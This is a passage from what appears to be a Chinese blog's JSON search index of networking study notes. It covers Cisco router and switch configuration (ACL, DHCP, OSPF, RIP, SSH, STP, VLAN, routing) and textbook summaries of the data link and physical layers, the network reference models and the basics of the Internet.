access-list {standard|extended} {name|1-99|100-199}# 在表内写语句, 序号默认10,20...[1-2147483647] {permit|deny}.... 不需要哪条语句时进命名ACL表no掉就好","link":"/Internet-equipment/Cisco/ACL.html"},{"title":"DCE和DTE的区别","text":"data circuit-terminating equipment (DCE) DCE是数据通信设备，如MODEM，连接DTE设备的通信设备。(一般广域网常用 DCE设备 有：CSU/DSU，广域网 交换机 ，MODEM) DTE设备是终端（或计算机） DTE和DCE只是针对串行端口的，路由器通常通过串行端口连接广域网络(串口便宜) DTE是针头（俗称 公头 ），DCE是孔头（俗称 母头 ） DTE,DCE的之间的区别是DCE一方提供时钟，DTE不提供时钟，但它依靠DCE提供的时钟工作 DCE,它在DTE和传输线路之间提供信号变换和编码功能，并负责建立、保持和释放链路的连接 参考文章 DTE和DCE详解","link":"/Internet-equipment/Cisco/DCE-DTE.html"},{"title":"DHCP","text":"分配IP的方式有两种: 一是静态手动分配 二是动态DHCP分配 原理已经计算机自顶向下中得知, 不在多说, 直接开始配置 1234567891011121314151617# 排除 IPv4 地址ip dhcp excluded-address low_address [height_address]# 配置地址池ip dhcp pool pool_name# 进入配置地址池后,# 定义地址池(必选)network network_ip [mask|/prefix-length]# 定义默认路由(必选)default-route address #可以有多个# [定义DNS服务器]dns-server address #可以有多个# [定义域名]domain-name domain# [租约]lease {days [hours] [minites] | infinite}# 禁用dhcp, 在config模式下no service dhcp","link":"/Internet-equipment/Cisco/DHCP.html"},{"title":"OSPF简述","text":"摘要 功能 无类 - OSPFv2 设计为无类方式；因此，它可支持 IPv4 VLSM 和 CIDR。 高效 - 路由变化会触发路由更新（非定期更新）。它使用 SPF 算法选择最优路径。 快速收敛 - 它能迅速地传播网络变化。 可扩展 - 在小型和大型网络中都能够良好运行。路由器可以分为多个区域，以支持分层结构。 安全 - OSPFv2 支持消息摘要 5 (MD5) 和安全散列算法 (SHA) 身份验证。OSPFv3 使用互联网协议安全性 (IPsec) 添加 OSPFv3 数据包的身份验证。启用身份验证时，OSPF 路由器只接受来自对等设备中具有相同预共享密钥的加密路由更新。 OSPF的AD为110 组件数据结构OSPF 创建和维护三种数据库： 邻接数据库 - 创建邻居表 链路状态数据库 (LSDB) - 创建拓扑表 转发数据库 - 创建路由表 这些表包含用于交换路由信息的邻接路由器列表，在 RAM 中保存和维护。 路由协议消息第 3 层设备（例如路由器）运行 OSPF 交换消息，使用 5 种类型的数据包传输路由信息。 Hello 数据包 数据库描述数据包 链路状态请求数据包 链路状态更新数据包 链路状态确认数据包 算法路由器使用根据 Dijkstra SPF 算法得出的计算结果创建拓扑表。 SPF 算法基于到达目的地的累计开销。","link":"/Internet-equipment/Cisco/OSPF.html"},{"title":"配置RIP","text":"路由信息协议（英语：Routing Information Protocol，缩写：RIP）是一种内部网关协议（IGP），为最早出现的距离向量路由协议。属于网络层，其主要应用于规模较小的、可靠性要求较低的网络，可以通过不断的交换信息让路由器动态的适应网络连接的变化，这些信息包括每个路由器可以到达哪些网络，这些网络有多远等。 虽然RIP仍然经常的被使用，但是由于收敛慢和支持的广播网络规模有限等缺点，许多人认为它将会而且正在被诸如OSPF和IS-IS这样的路由协议所取代。当然，我们也看到EIGRP，一种和RIP属于同一基本协议类但更具适应性的路由协议，也有被使用。 简介 RIP每隔30秒会与相邻的路由器交换子消息，以动态的创建路由表。 RIPv1使用分类路由，没有携带掩码信息, 不支持CIDR, 不支持验证 1234router rip # 配置RIP(v1)no router rip # 禁用RIPversion 2 # 启用v2show ip protocols # 显示ipv4路由协议(包括RIP) 通告网络进入RIP配置模式后, 设置需要通告的网络 1Router(config-router)#network network_ip 如果使用RIPv1, network_ip会自动汇总为有类网络地址 禁用自动汇总启用RIPv2后, 默认是启用自动汇总的, 在RIP配置模式下, 使用下面指令禁用 1no auto-summary 配置被动接口 默认情况下，将 RIP 更新从所有启用 RIP 的接口发出。但是，RIP 更新实际上仅需要从连接到其他启用 RIP 路由器的接口发出 在RIP配置模式下, 使用 passive-interface 路由器配置命令阻止通过路由器接口传输路由更新, 也就是将该接口配置成被动接口 所有路由协议都支持 passive-interface 命令。 传播默认路由首先在边缘路由器上配置RIP, 然后 1234# configip route 0.0.0.0 0.0.0.0 &lt;gw&gt;# RIP配置模式下default-information originate","link":"/Internet-equipment/Cisco/RIP.html"},{"title":"路由协议","text":"摘要 IGP 和 EGP 路由协议 自治系统 (AS) 是接受统一管理（比如公司或组织）的路由器集合。 内部网关协议 (IGP) - 用于在 AS 中实现路由。它也称为 AS 内路由。IGP 包括 RIP、EIGRP、OSPF 和 IS-IS。 外部网关协议 (EGP) - 用于在 AS 间实现路由。它也称为 AS 间路由。边界网关协议 (BGP) 是目前唯一可行的 EGP，也是互联网使用的官方路由协议。 距离矢量路由协议距离矢量意味着通过提供两个特征通告路由： 距离 - 根据度量（如跳数、开销、带宽、延迟等）确定与目的网络的距离。 矢量 - 指定下一跳路由器或送出接口的方向以达到目的地。 有四个距离矢量 IPv4 IGP： RIPv1 - 第一代传统协议 RIPv2 - 简单距离矢量路由协议 IGRP - 第一代思科专有协议（已过时并由 EIGRP 取代） EIGRP - 距离矢量路由高级版 链路状态路由协议 与距离矢量路由协议的运行过程不同，配置了链路状态路由协议的路由器可以获取所有其他路由器的信息来创建网络的完整视图（即拓扑结构）。 有两个链路状态 IPv4 IGP： OSPF - 常用的基于标准的路由协议 IS-IS - 常见于提供商网络 有类路由协议 有类路由协议和无类路由协议之间的最大区别是有类路由协议不会在路由更新中发送子网掩码信息。而无类路由协议在路由更新中包含子网掩码信息。 所开发的两个原始 IPv4 路由协议是 RIPv1 和 IGRP 无类路由协议 现代网络不再使用有类 IP 编址，因此子网掩码不能由第一个二进制八位数的值来确定。无类 IPv4 路由协议（RIPv2、EIGRP、OSPF 和 IS-IS）在路由更新中都包括网络地址的子网掩码信息。无类路由协议支持 VLSM 和 CIDR。 IPv6 路由协议是无类的。有类或无类的区别仅适用于 IPv4 路由协议。 路由协议特征收敛速度 - 收敛速度是指网络拓扑结构中的路由器共享路由信息并使各台路由器掌握的网络情况达到一致所需的时间 可扩展性 - 可扩展性表示根据一个网络所部署的路由协议，该网络能达到的规模 有类还是无类（使用 VLSM） - 有类路由协议不包含子网掩码，也不支持 VLS 资源使用率 - 资源使用率包括路由协议的要求，如：内存空间 (RAM)、CPU 利用率和链路带宽利用率 实现和维护 - 实现和维护体现了对于所部署的路由协议，网络管理员实现和维护网络时必须要具备的知识级别。 路由协议度量 路由信息协议 (RIP) - 跳数 开放最短路径优先 (OSPF) - 根据源到目的地的累积带宽计算出的思科成本 增强型内部网关路由协议 (EIGRP) – 最小带宽、延迟、负载和可靠性。","link":"/Internet-equipment/Cisco/Route.html"},{"title":"SSH","text":"安全外壳 (SSH) 是一种提供远程设备的安全（加密）管理连接的协议 配置 使用 show ssh 查看当前系统是否支持SSH 使用 ip domain-name (dname)设置域名 生成RSA秘钥对 1234# configip ssh version 2crypto key generate rsa # 长度crypto key zeroize rsa # 删除RSA, ssh会自动禁用 配置用户+密码 1username username secret password 配置vty线路 1234# configline vty 0-15 # 配置所有线路transport input ssh # 使用sshlogin local # 使用本地数据库(提供用户名+密码) 连接1ssh [-p port] username@host","link":"/Internet-equipment/Cisco/SSH.html"},{"title":"STP及变体","text":"当在交换网络中提供物理冗余时, 为了防止二层交换网络形成环路, 造成广播风暴等严重后果, 于是有了生成树等协议 对于生成树更好的理解, 我推荐这篇文章 STPBPDU是所有参与STP交换机的交流信息帧, 里面就有BID BID包含 优先级值(16个值, 默认32768, 步进4096), 源MAC, 扩展系统ID(STP是VLAN_id). show spanning-tree active时, 优先级=优先级值+VLAN_id 优先级可手动指定 spanning-tree vlan vlan_id priority ROOT Bridge BID最小的为根网桥 每个生成树实例（交换 LAN 或广播域）都有一台交换机指定为根网桥 为生成树实例选择根网桥后，STA 便开始确定从广播域内所有目的地到根网桥的最佳路径 相同优先级, MAC最小的是根网桥 端口角色根端口根端口靠近根网桥, 非根网桥只能有一个根端口 指定端口允许转发流量, 在某个网段里开销最小的端口为指定端口 非指定端口不允许转发流量, 在某个网段里开销最大的端口为非指定端口 RSTP(快速STP), 定义了代替端口 备用端口 禁用端口 根路径开销STA默认通过网速确认开销, 也可通过 spanning-tree vlan vlan_id cost cost_value手动修改(思科交换机默认的协议是 pvst+ ) 开销值决定了哪个接口处于转发(小的就转发) PVST+端口状态阻塞 - 该端口是替代端口，不参与帧转发。 侦听 - 侦听到根网桥的路径 学习 - 学习 MAC 地址 转发 - 该端口是活动拓扑的一部分 禁用 － 该第 2 层端口不参与生成树，不会转发帧。 使用 show spanning-tree summary 命令可以显示各种状态（阻塞、侦听、学习或转发）下的端口数量。 负载均衡与上面的STP不同, PVST+允许每个VLAN有一个STP实例 也就是说, 交换机上的一个中继端口可以阻止某个 VLAN, 同时转发其他 VLAN 12spanning-tree vlan vlan_id root {primary|secondary}# vlan_id可以有两种写法[1,2,3..|1-99] portfast将交换机的某个端口直接设置为转发状态 1234# 进入某接口spanning-tree portfast # 全局配置模式设置非TRUNK接口为portfastspanning-tree portfast default BPDUGUARD1234# 进入某接口spanning-tree bpdduguard enable# 全局配置模式设置非TRUNK接口为portfastspanning-tree portfast bpduguard default 快速PVST+ 快速PVST+可以将RSTP应用到每个VLAN RSTP相对与STP有更快的收敛速度 PSTP定义了新的端口状态, 如果端口被配置为替代端口或备用端口, 则该端口可以立即转换到转发状态, 而无需等待网络收敛 边缘端口 RSTP 边缘端口概念对应 PVST+ PortFast 功能 RSTP 边缘端口应立即转换到转发状态，从而跳过原始 802.1D 中耗时的侦听和学习端口状态 spanning-tree portfast 命令来执行边缘端口配置 建议不要将边缘端口配置为连接其他交换机 边缘端口一般与用户终端设备连接 链路类型 点对点 - 在全双工模式下运行的端口通常将交换机连接到交换机，并且是快速转换到转发状态的候选端口。 共享 - 在半双工模式下运行的端口将交换机连接到连接各种设备的集线器。 一般都是自动确定, 也可手动选择 1spanning-tree link-type { point-to-point | shared } 负载均衡同样支持负载均衡, 与PVST+语法相同","link":"/Internet-equipment/Cisco/STP.html"},{"title":"路由相关知识","text":"当两个不同得网段需要通信时, 就会需要路由器. 路由到其他网络的方法又分为静态和动态, 一个路由器上也可以存在两种配置 动态需要占用额外的带宽, 存在一定安全隐患, 但易维护 静态适合小型网络 当静态和动态冲突时, 会选择两者之中管理距离最小(AD)的转发 静态路由 配置: ip route 查看: show ip route show ip route static show ip route 网络 IPv6必须在全局配置ipv6 unicast-routing命令。 将上面的ip换成ipv6即可配置和查看 默认静态路由 如果一台路由器仅有另外一台路由器与之相连，在这种情况下，路由器称为末节路由器。 末节路由器和边缘路由器通常采用默认静态路由 默认静态路由仅是 0.0.0.0/0 作为目标 IPv4 地址的静态路由。 IPv6是 ::/0 汇总静态路由 对于多条连续的网络条目, 可以将其汇总成一条减少路由条目数量 1234567172.20.0.0/16172.21.0.0/16172.22.0.0/16172.23.0.0/16|v172.20.0.0/14 浮动静态路由相当于备用路由, 管理距离要比静态/动态的大 跳选项 CEF（思科快速转发）是运行 IOS 12.0 或更高版本的大多数平台的默认行为 使用 CEF 时不需要完全指定静态路由。应采用使用下一跳地址的静态路由。 路由分为以下三种类型： 下一跳路由 - 仅指定下一跳 IP 地址 指定后不可避免的就是递归查找(耗费资源) IOS 12.0使用了CEF, 避免了递归查找 直连静态路由 - 仅指定路由器退出接口 完全指定静态路由 - 指定下一跳 IP 地址和退出接口 早期IOS规避递归查找的办法 动态路由 动态路由协议自上个世纪八十年代后期开始应用于网络。RIP 是第一批路由协议中的一个. RIP 协议更新为 RIPv2 以适应网络环境的发展。 但是，RIPv2 仍无法扩展以适应当今的大型网络实施。 为了满足大型网络的需要，两种高级路由协议应运而生：开放最短路径优先协议 (OSPF) 和中间系统到中间系统协议 (IS-IS)。思科也推出了面向大型网络实施的“内部网关路由协议”(IGRP) 和增强型 IGRP (EIGRP) 协议 此外，需要连接不同的网际网络并在它们之间提供路由。边界网关协议 (BGP) 当前用于互联网服务提供商 (ISPs) 之间。 BGP 还用于 ISP 与其较大的私有客户端之间来交换路由信息。 动态路由协议的主要组件包括： 数据结构 - 路由协议通常使用路由表或数据库来完成路由过程。此类信息保存在内存中。 路由协议消息 - 路由协议使用各种消息找出邻近的路由器，交换路由信息，并通过其他一些任务来获取和维护准确的网络信息。 算法 - 算法是指用于完成某个任务的一定数量的步骤。路由协议使用算法获取路由信息并确定最佳路径。 路由条目 优先选择最长的子网掩码的路由，如果有多条路由，则匹配管理距离，管理距离小的路由优先，如果管理距离相同，在匹配度量值，度量值小的优先，如果度量值相同，则选择负载均衡，具体的方式看采用哪种路由协议和相关的配置了。 术语 最终路由 - 最终路由是包含下一跳 IPv4 地址或送出接口的路由表条目。动态获知的直连本地路由为最终路由 一级路由 - 1 级路由是指子网掩码等于或小于网络地址有类掩码的路由. 比如 网络路由 - 是指子网掩码等于有类掩码的路由。 超网路由 - 是指掩码小于有类掩码（例如，汇总地址）的网络地址。 默认路由 - 是指地址为 0.0.0.0/0 的静态路由。 一级路由可以是最终路由 一级父路由 - 父路由是划分子网的 1 级网络路由。父路由不可以是最终路由 二级子路由 - 2 级子路由是指有类网络地址的子网路由 单臂路由 与路由器连接的交换机需要开启trunk 路由器使用 intface g0/1[.id]创建子接口 给子接口分配 ip encapsulation dot1q vlan_id 开启父接口 路由器查看指令: show vlan show ip route","link":"/Internet-equipment/Cisco/about-route.html"},{"title":"Vlan相关知识","text":"本文收集了学习中的一些疑问而在网络上查询的一些文章 为什么需要VLAN 划分广播域 静态, 动态VLAN VLAN的端口类型(Access, trunk) VLAN间路由 图解：快速计算冲突域和广播域数目 本征VLAN在trunk接口里, 如果接收到没有Vlan封装的数据包时, 会为其打上native vlan的tag. 主要作用就是为了兼容不支持vlan的设备 端口绑定 动态模式下需要ping使用 show mac-address-table 才会显示MAC地址(ARP) 为了VLAN内的安全, 需要将交换机的端口与主机MAC或主机MAC与IP进行绑定 绑定MAC1234Switch(config)#interface f0/1Switch(config-if)#switchport mode access #思科默认端口模式是dynamic(动态),端口绑定不能是动态Switch(config-if)#switchport port-security #配置端口安全模式Switch(config-if)#switchport port-security mac-address mac_address #绑定mac 绑定后非该MAC不能使用网络 绑定MAC与IP 使用MAC地址ACL表与ip地址ACL表组合 思科2950、3550、4500、6500系列交换机上可以实现，但是需要注意的是2950、3550需要交换机运行增强的软件镜像（Enhanced Image） cisco三层交换机 no switchport启用路由端口 ip routing启用路由功能 路由端口不支持子接口 路由端口不支持二层协议(并不是全部, STP) 创建SVI要保证VLAN在VLAN数据库内 Trunk配置Trunk需要注意三点： 两个端口之间本征vlan必须一致 两端必须都为Trunk 允许相同vlan通过 检验 show interfaces [interface_name] trunk 指令 开启trunk后, 默认会为vlan1转发流量 创建VLAN: vlan vlan_id 创建多个VLAN：vlan 1,3,100-120 vlan_id范围：1-1005 扩展vlan_id：1006-4096 显示vlan信息: show vlan [brief|id vlan_id|name vlan_name|summary] show interfaces [interface_id|vlan vlan_id|switchport] 配置本征VLAN: switchport trunk native vlan (vlan-id) 不要指定vlan1 中继链路上允许通过的 VLAN 列表:switchport trunk allowed vlan vlan-list list写法: 1,2,3,4…. 默认允许1-1005 接口switchport信息: show interfaces (f/g) switchport 更改中继封装协议: switchport trunk encapsulation (dot1q/isl)","link":"/Internet-equipment/Cisco/about-vlan.html"},{"title":"数据链路层","text":"参考南京邮电大学的网络技术与应用课与Andrew S. Tanenbaum与David J. Wetherall的计算机网络（第五版） 1.设计问题数据链路层使用物理层提供的服务在通信信道上发送和接收比特，它的功能主要有 给网络层提供一个定义良好的服务接口 处理传输错误 调节数据流，确保慢速的接收方不会被快速的发送方淹没 1.1成帧数据链路层主要将物理层传递的原始数据流拆成离散的“帧”，进行纠错和检错等工作 成帧的方法 字节计数法 利用头部的字段来标识该帧的字符数，缺点是当传输错误导致计数值错误，从而会使接收方失去同步（即使想重传也不知道重传的字节），字节计数很少被使用 字节填充的标志字节 考虑了重传问题，每帧使用特殊字节包装了帧的开始和结束，称为标志字节（flag byte），失去同步时就可以搜索两个字节。 在数据中如果出现标志字节就会导致误判，所以发送方会在这些数据中的标志字节前面加上转义字节（ESC），将分界符与数据分开来，接收方会在接收时删除这些转义字节，这种技术叫字节填充，如果数据中出现转义字节，那就转转义 缺点：只能使用8bit的字节，帧大小根据内容而定，若没有标志字节，则帧和数据一样长，若都是标志字节，帧增长两倍 应用：PPP协议 比特填充的标志比特法 这是在比特级成帧的方法，每个帧的开始和结束都有一个特定的比特模式（不一定是8bit），01 11 11 10或11 11 11 10标记，这是标记字节。类似字节填充，比特填充就是在发送方的数据中如果出现连续的5个1，就会在后面填充一个0，这样保证了标志字节是唯一的，只出现在边界。 缺点：帧的长度取决于数据本身，若没有标志字节，则帧和数据一样长，若都是标志字节，由于每个字节都需要转义，帧增长12.5% 物理层编码违禁法 当物理层采用特定的比特编码方法时，利用物理层将比特编码成信号通常包含一些冗余比特，区分帧的开始和结束 1.2差错控制当接收方知道帧是否出错（通过纠错码和检错码）时，对于无缺认的无连接服务，只需要保存出境帧就可以，但对于可靠的连接服务，还需要接收方对接收情况进行反馈（返回一个控制帧，会对接收帧进行肯定和否定的确认），若错误则重传 考虑一种复杂的情况，那就是因为硬件问题导致帧被完全丢失，这时接收方不会由任何反应，发动方也会永久等待下去，这时就要加入计时器，时长要能保证帧到达接收方，当返回确认帧时计时器取消，当帧或确认帧丢失时，计时器触发，解决方案就是重新发送帧，考虑会出现接收方会多次接收同一帧的情况，发送时需要给帧分配序号，接收方就可以区分原始帧和重传帧 1.3流量控制处理发送方发送帧的速度超过接收方接收帧的速度时的问题 处理的两种方法 基于反馈的流量控制（feedback-based flow control） 接收方向发送方返回接收信息，允许他发送更多数据，或告诉它自己的情况 基于速率的流量控制（rate-based flow control） 使用这种方法的协议内置的机制，限制发送方的速率 基本上数据链路层的速度都很快，不会丢帧，过载由高层处理 2.差错检错和纠正在传输过程中数据传输数据与元数据不一致就是传输差错，差错控制就是为了检测这个错误和纠正错误的。虽然是在链路层介绍，但数据可靠性是整个系统关注的问题，纠错码也会出现在物理层或者更高的层次，检错码一般是是链路层、网络层、传输层 每一项技术都适用于不同的位置，在光纤上通常采用检错（误码率低），纠错被用到有噪声的信道上 两种错误模型：单比特错误和突发性错误，原因：有线信道-脉冲干扰，无线信道-脉冲干扰、脉冲衰弱 2.1思想由于原始数据是独立随机的，需要加入一些数据与原始数据产生约束关系，这些数据相对于原始数据是多余的，在一定程度上会降低传输效率 2.2方式 检错重发 前向纠错（FEC） 混合纠错检错 信息反馈 2.3纠错码 海明码 二进制卷积码 里德所罗门码 低密度奇偶校验码 2.4检错码2.4.1奇偶校验码原理：在传输数据后加监督位，使它有奇数个1或偶数个1 缺点：只能检测出奇数个错，若出错两个位则检测不出 2.4.2循环冗余码CRC（Cyclic Redundancy Check）比奇偶校验码的方式的检错能力更强 原理：将原有数据$M(k位)$后面添加差错检测的$n$位冗余码，构成帧发出去，发出去（k+n）位 冗余码算法 首先进行$M=2^n×M$运算，就是在后面添加n个0 然后使用 $M$ 对约定好的n+1位的 $P$ 数据进行模2除运算（异或XOR，相同为0,不同为1），模运算不借位，$P$ 是根据生成多项式 $G(x)$ 而来 得到的余数 $R$ 就是FCS（帧检测序列） 真正要发送的就是$2^nM+R$ 接收方使用发送的数据模2除 $P$，余数为0则没有错误 设发送的数据为$C(x)$，则有 $$C(x)=2^nM(x)+R(x)$$ 特点： CRC只能做到无差错接收 若要可靠传输，则需要加上确认和重传机制 3.基本数据链路协议4.MAC该笔记终止记录 由于书上自下向上开始介绍，内容比较晦涩、难读，我还是基础不好只能与这本书暂时再见了，等我深造时在开启这本书。 换个思路重新学网络，找到了《计算机网络自顶向下方法》开始学习，待我学成，必将开启新篇章！","link":"/Networking/NOTE/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82.html"},{"title":"物理层-数据通信","text":"参考南京邮电大学的网络技术与应用课与Andrew S. Tanenbaum与David J. Wetherall的计算机网络（第五版） 1.基本概念1.1信号、数据和信号数据通信的目的就是交换信息，而数据就是信息的载体，数据又分为模拟数据（连续）和数字数据（离散，如01），它两个之间可以互相转换；信号就是数据在传输过程中的电磁波编码，同样分为模拟信号（连续的电磁波）和数字信号（电压脉冲） 1.2数据通信系统 1.3技术指标1.3.1传输速率传码速率 又称为调制速率、波特率，指每秒传输信号码元的个数，记作$N_{Bd}$，单位波特（Baud） 携带数据信息的信号脉冲就叫信号码元，一个信号脉冲可以代表多个0，1的组合 在上述二电平图中，信号码元的持续时间是$T$，所以传码速率是$\\Large\\frac{1}{T}$ 传信速率 又叫比特率，记作$R_b$，单位bit/s、kbit/s… 两者关系$$R_b=N_{Bd}\\times\\log_2 M(M表示电平)$$ 在二电平中（一次脉冲传输1bit），波特率和比特率数值相等 1.3.2信号带宽带宽（bandwidth）本来是指某个信号的频带宽度（范围），单位Hz、KHz、MHz（频率域） 在传输数据时，把带宽作为数字信道的数据传输速率，此时单位就是bit/s、Kbit/s（时间域） 两者本质一样 1.3.3误码率和误组率误码率 指在一定时间内接收到出错的bit数与传输的总bit数之比，是评定传输质量的一项指标 $$P_e=\\frac{e_1}{e_2}\\times100%$$ 误组率 因为在数据块结构和帧结构的控制下，误码率不能不能确切知道它的差错造成的影响，一般用误组率表示通信质量$$P_b=\\frac{b_1}{b_2}\\times100%$$ 1.3.4时延delay指一个分组从一条链路的一端到另一端需要的时间，这个时间由几个不同的部分组成 (1)发送时延 节点发送数据到传输媒体（网卡，路由）使用的时间，计算公式$$发送时延=\\frac{数据长度bit}{信道带宽b/s}$$信道带宽又叫发送速率，传输速率 (2)传播时延 指的是电磁波在信道中传播一定的距离所发送的时间，也就是路由器到路由器时间，公式$$传播时延=\\frac{信道长度m}{传播速度m/s}$$(3)处理时延 指数据在交换节点储存-转发的时间，在节点的缓存队列中排队所经历的时间是处理时延的主要部分$$总时延=发送时延+传播时延+处理时延$$ 一般只考虑前面两种时延，大文件主要考虑发送时延，小文件考虑传播时延 1.3.5信道容量指在一定条件下（误码，带宽，噪声），在通信路径(信道)所能达到大数据传输速率 分有无噪声的情况分析 奈奎斯特准则：在理想条件下，带宽为$W$Hz的信道，传码速率最高为2$W$波特 公式：$C=2Wlog_2 M$ 香农定理：在有噪声的环境中，信道容量与信噪功率比($S/N$)有关 公式1：$C=2W\\log_2\\small{(1+S/N)}$ 公式2：$dB=10log_{10}\\small({信号功率P_S/噪声功率P_N})$ 它告诉我们在信道容量不变时可以增加带宽就可以降低信噪比 1.4传输介质有线的传输介质有双绞线、同轴线缆、光纤等 无线的传输介质有无线电波、地面微波、卫星微波、红外线等 2.多路复用技术指在一条通信线路中传输多路信号，提高传输媒介利用率 2.1频分复用FDM（Frequency Division Multiplexing）利用的是通信线路的可用带宽超过需要的带宽（这里指Hz），则可以将信号以不同的载波频率进行调制（不能重叠），使每个信号都有一个独立的信道传输 也就是说在相同时间内占用不同的频率带宽 2.2时分复用TDM（Time Division Multiplexing）是一种固定分配资源的方式，将传输时间分成多个片段，每个用户分得一个片段，一组时间片叫作帧 在不同时间内占用相同的频率带宽 上面两种技术的用户会一直占用信道资源，因此对信道利用率都不高 2.3统计时分复用STDM（Statistical Time Division Multiplexing）与时分复用相同的是信道是按时间片分配的，不同的是时间片是动态分配的，每个用户的数据传输速率最高可以达到该线路总的传输能力 2.4波分复用WDM（Wavelength Division Multiplexing）与FDM类似，指的是在一条光纤内传输多路不同波长的光信号 2.5码分复用CDM（Coding Division Multiplexing）指的是每个用户有一个单独的码片序列（所有码片必须正交） 当发送1时，就发送原序列 发送0时，发送补码序列 什么都不做时就是0 将所有信号相加得到发送信号，接收端使用某个用户的码片序列和接收到的信号即可得到这个用户发送的信息 例如 用户 码片序列 发送信号 A ( 0 1 0 1 )，发送1 (-1 +1 -1 +1) B ( 0 0 1 1 )，发送0 (+1 +1 -1 -1) C ( 0 0 0 0 )，发送1 (-1 -1 -1 -1) 将上面的序列相加得到发送信号(-1 +1 -3 -1) 用户 计算 数据 A $\\frac{1}{4}\\times(-1 +1 -3 -1)\\times(-1 +1 -1 +1)=+1$ 1 B $\\frac{1}{4}\\times(-1 +1 -3 -1)\\times(-1 -1 +1 +1)=-1$ 0 C $\\frac{1}{4}\\times(-1 +1 -3 -1)\\times(-1 -1 -1 -1)=+1$ 1","link":"/Networking/NOTE/%E7%89%A9%E7%90%86%E5%B1%82-%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1.html"},{"title":"网络参考模型","text":"1.OSIOSI（Open Systems Interconnection）开放系统互连，是ISO提出的参考模型 物理层（physical layer） 传输的单位是bit，主要涉及机械，电子和时序接口，还有以下的物理介质 数据链路层（data link） 将输入的数据拆分成数据帧（data frame），顺序发送 网络层（network） 控制着子网的运行，传输单位是数据包，也叫分组 传输层（transport） 接收上一层的数据，在必要时分割数据传递给网络层，还确保了数据正确达到另一端 传输层是真正端到端的层，它自始自终将数据从源携带给接收方，而它下面的层，都被多个路由隔开了 1-3层是链式连接的，4-7层是端到端的 会话层（session） 允许不同机器上的用户建立会话，提供了对话控制、令牌管理和同步等功能 表示层（presentation） 关注语法和语义，使计算机能进行通信 应用层（application） 数据从网络相关的程序以这种应用内部使用的格式进行传送，然后编码成标准协议的格式。 包含了用户需要的各种协议，比如HTTP，FTP，SMTP 2.TCP/IPTCP/IP代表的不仅仅是TCP（transport control protocol）和IP（Internet Protocol），只是因为这两个协议最主要才这样命名的","link":"/Networking/NOTE/%E7%BD%91%E7%BB%9C%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B.html"},{"title":"网络基础","text":"1.网络硬件1.1传输技术点到点点到点（point to point）链路是将一对单独的机器连接起来。点到点传输只有一个接收方和一个发送方，也叫单播（unicasting） 广播在广播网络上，通信信道被所有机器共享，每一台机器发送数据包，其他机器都能收到，然后根据数据包内的地址判断是否接收。 广播也能将一个数据包发给所有目标机器，这种传输模式就叫广播（broadcasting），给一组机器传输数据包时就叫组播（multicating） 1.2网络尺度PAN个域网（Personal Area Network）指的是设备围绕一个人通信，比如键盘，鼠标，蓝牙耳机… LAN局域网（Local Area Network）是一种私有网络，存在于家庭，公司，工厂。 一般都是每台计算机与另一个设备通信，这个设备被称为接入点（AP，Access Point）、无线路由器（wireless router）或者基站（base station），他们负责处理数据包 MAN城域网（Metropolitan Area Network）的范围覆盖一个城市，比如有线电视网 WAN广域网（Wide Area Network）通常跨越一个国家、地区或者一个大陆 互联网为了让不同的硬件和软件连接起来，于是就有了互联网（internet） 2.网络软件2.1协议层次结构类似于编程的抽象接口，封装思想，向用户提供服务时，将内部算法细节隐藏起来 为了简化网络设计的复杂性，将网络进行了分层，每层的功能、内容都不相同，每层都向上一层提供特定的服务 每个机器的第n层与其他机器的第n层进行交流都会使用相同的规则，这个规则就叫协议（protocol），最下层都是物理介质 层与层之间存在接口（interface），定义上层可以使用下层的哪些服务 层与协议的集合被称为网络体系结构（network architectrue），编写程序和设计硬件都必须遵循相关的协议，体系结构不包括协议的具体实现和接口规范 每层的协议组合起来就是协议栈（protocol stack），原始信息在层与层之间传递时，每层都会把信息包装，到另一个机器时才会一步一步解开包装得到信息 2.2面向连接和无连接面向连接的服务（connection-oriented service）类似电话，服务用户需要建立一个连接（打电话），传输数据（说话），断开连接（挂）. 无连接服务（confectionless service）是按照邮政系统建模的，每个报文（信件）都有地址 ，然后发往目的地 六种不同类型的服务（前三个是面向连接） 服务 例子 可靠的报文流 顺序页面 可靠的字节流 移动下载 不可靠的连接 IP语音 不可靠的数据报 垃圾邮件 有确认的数据报 文本消息 请求-应答 数据库查询 2.3服务原语一个服务由一组原语（primitive）正式说明，原语规定了服务执行的动作 2.4服务与协议的关系服务是垂直的，它向上一层提供原语 协议是水平的，它是一组规则，规定了两个不同计算机交换数据包的格式和含义 服务就像抽象类，协议就像具体实现","link":"/Networking/NOTE/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80.html"},{"title":"1.计算机网络与因特网","text":"参考《计算机网络自顶向下方法》 1.1基础概念介绍网络的基本构成与一些专业术语 1.1.1-网络构成因特网是一个世界范围的计算机网络。我们将接入因特网的设备称为主机（host）或者端系统（end system），因为他们处于网络边缘。 每个主机通过通信链路（communication link）和分组交换机（packet switch）连接在一起。 通信链路由各种物理媒体组成，同轴电缆、铜线、光纤、无线电频谱。当主机发送数据时，会将数据拆成段并为每段加工一些信息成为信息包，我们称为分组（packet），到达目的主机再重组。 分组交换机从通信链路接收分组，从另一条链路发送分组。比较著名的交换机类型是路由器（router）和链路层交换机（link-layer switch），链路交换机通常用于接入，路由器通常在网络核心。一个分组将经历一系列网络路径到达目的主机。 主机通过因特网服务提供商（Internet Service Provider,ISP）接入因特网，因为主机之间需要互联，所以ISP之间也会通过国家、国际的ISP连接。 主机、交换机等其他网络设备都要遵循一系列协议，用来控制接收和发送，如TCP/IP。协议的标准由许多组织规定，如因特网标准由IETE研发，IEEE 802制定了无线wifi的标准。 1.1.2-服务主机上的软件如何与目标主机的软件通信呢？每个主机都提供了一套因特网API，使用这些API写的软件就可以与其他主机上的软件进行通信。 1.1.3-协议使用人类之间交流来理解计算机协议，比如小明想小红现在几点了，首先她们都要有时间的概念，其次她们能听懂各自说的话，才能够正常交流。 网络协议定义了多个通信实体之间的交换的报文（数据块）格式和次序，以及发送/接收或其他事件采取的动作 1.2-网络边缘边缘指的就是与互联网相连的计算机，他们处于因特网的边缘，所以被称为端系统。端系统=主机 主机里有各种应用程序，主机再细分为客户（client）和服务器（server），服务器相当于性能强大的机器。 1.2.1-接入网主要指边缘路由器（edge router），主机网络路径上的第一台路由器 家庭接入 1.DSL 住宅可以从提供本地电话接入的电话公司获取数字用户线（Digital Subscriber 